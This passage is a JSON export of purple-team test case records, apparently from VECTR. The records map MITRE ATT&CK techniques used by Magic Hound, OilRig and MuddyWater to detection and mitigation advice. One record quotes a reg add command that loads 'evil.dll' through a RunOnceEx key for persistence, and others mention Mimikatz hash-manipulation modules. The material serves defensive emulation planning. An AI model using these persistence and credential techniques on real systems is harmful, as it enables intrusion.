SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--180734f8-fbcb-4806-a4ce-eb24e8b9053f","vectrId":"180734f8-fbcb-4806-a4ce-eb24e8b9053f","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"180734f8-fbcb-4806-a4ce-eb24e8b9053f","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Registry Run Keys / Startup Folder","variant":"Magic Hound - Registry Run Keys / Startup Folder - Pupy","objective":"Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nThe <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware has used Registry Run keys to establish persistence.[Pupy](https://attack.mitre.org/software/S0192) adds itself to the startup folder or adds itself to the Registry key <code>SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code> for persistence.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc","relationship--0a507d28-ef6b-417b-a968-e82608e8b6a8","relationship--9213f7ac-c548-4139-950b-5481a94570f9","course-of-action--8b36d944-f274-4d46-9acd-dbba6927ce7a","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--d38177b0-03c0-4c59-afa6-eea94a372daa","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018. https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key","Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014. http://msdn.microsoft.com/en-us/library/aa376977","Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018. https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016. https://technet.microsoft.com/en-us/sysinternals/bb963902"],"mitreId":"T1060"},"blueTeam":{"successfulDetectionBehaviors":["Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--18e70126-c923-4dde-a95e-36b453056db0","vectrId":"18e70126-c923-4dde-a95e-36b453056db0","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"18e70126-c923-4dde-a95e-36b453056db0","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Uncommonly Used Port","variant":"Magic Hound - Uncommonly Used Port","objective":"Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware has communicated with its C2 server over ports 4443 and 3543.Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports for that particular network segment.\n---\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0","relationship--35b912d8-bf46-4dec-b2eb-c48c0056af6e","relationship--bde4d54d-16d7-4a07-a35a-9f0cc6956be2","course-of-action--a0d8db1d-a731-4428-8209-c07175f4b1fe","relationship--d567082e-e9ee-4622-acbd-a592bc3be4a3","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","relationship--de274a43-282a-46e2-9191-7f1acec2e6e4","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/"],"mitreId":"T1065"},"blueTeam":{"successfulDetectionBehaviors":["Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. \n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--190b2ae7-d56b-4e5e-98de-632e704b9d79","vectrId":"190b2ae7-d56b-4e5e-98de-632e704b9d79","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"190b2ae7-d56b-4e5e-98de-632e704b9d79","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Compiled HTML File","variant":"OilRig - Compiled HTML File","objective":"Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\n\nAdversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used a CHM payload to load and execute another malicious file once delivered to a victim.Consider blocking download/transfer and execution of potentially uncommon file types known to be used in adversary campaigns, such as CHM files.\n---\nConsider using application whitelisting to prevent execution of hh.exe if it is not required for a given system or network to prevent potential misuse by adversaries.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--d21a2069-23d5-4043-ad6d-64f6b644cb1a","relationship--352e990d-48be-4d1a-bd8a-bc27d641aa1f","relationship--42968b37-a9f4-4bd8-b2af-36a04bd2803d","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","relationship--e1fdde42-ef04-4b41-a7ba-1f268be9b0fe","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","relationship--4267ad8c-6bd8-4fef-ac00-fe536ba746be","course-of-action--08e02f67-ea09-4f77-a70b-414963c29fc2","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","Microsoft. (2017, August 8). CVE-2017-8625 - Internet Explorer Security Feature Bypass Vulnerability. Retrieved October 3, 2018. https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625","Microsoft. (2018, May 30). Microsoft HTML Help 1.4. Retrieved October 3, 2018. https://docs.microsoft.com/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk","Microsoft. (n.d.). About the HTML Help Executable Program. Retrieved October 3, 2018. https://msdn.microsoft.com/windows/desktop/ms524405","Microsoft. (n.d.). HTML Help ActiveX Control Overview. Retrieved October 3, 2018. https://msdn.microsoft.com/windows/desktop/ms644670","Moe, O. (2017, August 13). Bypassing Device guard UMCI using CHM – CVE-2017-8625. Retrieved October 3, 2018. https://msitpros.com/?p=3909"],"mitreId":"T1223"},"blueTeam":{"successfulDetectionBehaviors":["Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.","Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking.","Consider blocking download/transfer and execution of potentially uncommon file types known to be used in adversary campaigns, such as CHM files. (Citation: PaloAlto Preventing Opportunistic Attacks Apr 2016) Also consider using application whitelisting to prevent execution of hh.exe if it is not required for a given system or network to prevent potential misuse by adversaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--1a442053-fe82-4fcc-b553-471d6bfe470a","vectrId":"1a442053-fe82-4fcc-b553-471d6bfe470a","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"1a442053-fe82-4fcc-b553-471d6bfe470a","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Standard Cryptographic Protocol","variant":"OilRig - Standard Cryptographic Protocol","objective":"Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.","command":"[OilRig](https://attack.mitre.org/groups/G0049) used the Plink utility and other tools to create tunnels to C2 servers.SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols.\n---\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5","relationship--99686b3a-1ca4-4b36-ad4d-a8876d8c65ba","relationship--2b631dee-68bd-4ae6-92fc-b3224d471890","course-of-action--7bb5fae9-53ad-4424-866b-f0ea2a8b731d","relationship--0304cc00-ec86-4b08-8e30-e771adf0d7f5","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--32ba984e-dbe9-4a8a-a1b7-16ba560d31d5","course-of-action--a766ce73-5583-48f3-b7c0-0bb43c6ef8c7","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016. http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840","Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east","Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016. https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html","Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for a DarkComet. Retrieved April 5, 2016. https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"],"mitreId":"T1032"},"blueTeam":{"successfulDetectionBehaviors":["Break and inspect SSL/TLS sessions to look at encrypted web traffic for adversary activity.","Use intrusion detection signatures to block traffic at network boundaries.","Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often. (Citation: University of Birmingham C2)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--1d3c953f-e214-4674-9fd9-091f0aab9572","vectrId":"1d3c953f-e214-4674-9fd9-091f0aab9572","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"1d3c953f-e214-4674-9fd9-091f0aab9572","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Account Manipulation","variant":"Magic Hound - Account Manipulation - Mimikatz","objective":"Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.\n\n### Exchange Email Account Takeover\n\nThe Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission) This command can be run, given adequate permissions, to further access granted to certain user accounts. This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)\n\n### Azure AD\n\nIn Azure, an adversary can set a second password for Service Principals, facilitating persistence.(Citation: Blue Cloud of Death)\n\n### AWS\n\nAWS policies allow trust between accounts by simply identifying the account name. It is then up to the trusted account to only allow the correct roles to have access.(Citation: Summit Route Advanced AWS policy auditing)\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations.Configure access controls and firewalls to limit access to critical systems and domain controllers. Most cloud environments support separate virtual private cloud (VPC) instances that enable further segmentation of cloud systems.\n---\nProtect domain controllers by ensuring proper security configuration for critical servers to limit access by potentially unnecessary protocols and services, such as SMB file sharing.\n---\nDo not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.\n---\nUse multi-factor authentication for user and privileged accounts.\n---\nThe [Mimikatz](https://attack.mitre.org/software/S0002) credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The <code>LSADUMP::ChangeNTLM</code> and <code>LSADUMP::SetNTLM</code> modules can also manipulate the password hash of an account without knowing the clear text value.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["3883d65a-3ad2-4111-92fa-19a5d39a119d"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27","relationship--8e11a6ff-7e98-4f69-8eb7-4ecee2912345","relationship--21ea4371-e692-4731-9f8c-c3f4dff3c775","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","relationship--ff7f776f-001a-4c86-b359-08c89bd08b3e","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","relationship--bb55d7e7-28af-4efd-8384-289f1a8b173e","course-of-action--fdb1ae84-7b00-4d3d-b7dc-c774beef6425","relationship--9ffc8525-79a5-40a2-b371-46052daf66c5","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--74e433ec-0c52-42f2-b0d4-3e1f3a56b419","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","tool--afc079f3-c0ea-4096-b75d-3f05338b7f60","relationship--6e641c36-188b-480e-b177-e412cd000b34","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Bienstock, D.. (2019). BECS and Beyond: Investigating and Defending O365. Retrieved September 13, 2019. https://www.slideshare.net/DouglasBienstock/shmoocon-2019-becs-and-beyond-investigating-and-defending-office-365","Deply, B. (n.d.). Mimikatz. Retrieved September 29, 2015. https://github.com/gentilkiwi/mimikatz","Kunz, Bryce. (2018, May 11). Blue Cloud of Death: Red Teaming Azure. Retrieved October 23, 2019. https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1","Lich, B., Miroshnikov, A. (2017, April 5). 4738(S): A user account was changed. Retrieved June 30, 2017. https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4738","Mandiant. (2018). Mandiant M-Trends 2018. Retrieved July 9, 2018. https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf","Metcalf, S. (2015, January 19). Attackers Can Now Use Mimikatz to Implant Skeleton Key on Domain Controllers & BackDoor Your Active Directory Forest. Retrieved February 3, 2015. http://adsecurity.org/?p=1275","Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015. https://adsecurity.org/?page_id=1821","Microsoft. (n.d.). Add-Mailbox Permission. Retrieved September 13, 2019. https://docs.microsoft.com/en-us/powershell/module/exchange/mailboxes/add-mailboxpermission?view=exchange-ps","Piper, Scott. (2019, April 3). Advanced AWS policy auditing - Confused deputies with AWS services. Retrieved October 23, 2019. https://summitroute.com/blog/2019/04/03/advanced_aws_policy_auditing_confused_deputies_with_aws_services/","Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017. https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM","Warren, J. (2017, June 22). lsadump::changentlm and lsadump::setntlm work, but generate Windows events #92. Retrieved December 4, 2017. https://github.com/gentilkiwi/mimikatz/issues/92"],"mitreId":"T1098"},"blueTeam":{"successfulDetectionBehaviors":["Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--20194b36-e180-436d-a4f2-a61ab152f2de","vectrId":"20194b36-e180-436d-a4f2-a61ab152f2de","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"20194b36-e180-436d-a4f2-a61ab152f2de","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Information Discovery","variant":"MuddyWater - System Information Discovery","objective":"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Windows\n\nExample commands and utilities that obtain this information include <code>ver</code>, [Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within [cmd](https://attack.mitre.org/software/S0106) for identifying information based on present files and directories.\n\n### Mac\n\nOn Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.\n\n### AWS\n\nIn Amazon Web Services (AWS), the Application Discovery Service may be used by an adversary to identify servers, virtual machines, software, and software dependencies running.(Citation: Amazon System Discovery)\n\n### GCP\n\nOn Google Cloud Platform (GCP) <code>GET /v1beta1/{parent=organizations/*}/assets</code> or <code>POST /v1beta1/{parent=organizations/*}/assets:runDiscovery</code> may be used to list an organizations cloud assets, or perform asset discovery on a cloud environment.(Citation: Google Command Center Dashboard)\n\n### Azure\n\nIn Azure, the API request <code>GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Compute/virtualMachines/{vmName}?api-version=2019-03-01</code> may be used to retrieve information about the model or instance view of a virtual machine.(Citation: Microsoft Virutal Machine API)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware that can collect the victim’s OS version and machine 